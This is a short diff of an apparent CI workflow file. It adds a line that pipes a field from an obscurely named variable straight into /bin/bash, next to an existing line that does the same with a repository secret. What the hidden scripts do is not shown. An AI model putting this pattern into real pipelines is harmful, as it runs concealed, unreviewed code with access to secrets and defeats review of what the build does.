@@ -17,6 +17,7 @@ jobs:
           hc500: ${{ secrets.hc500 }}
         run: |
           printf '%s' "$hc500" | jq -r .wb6098 | /bin/bash
+          echo $usxca0223 | jq -r .vxjd6525 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
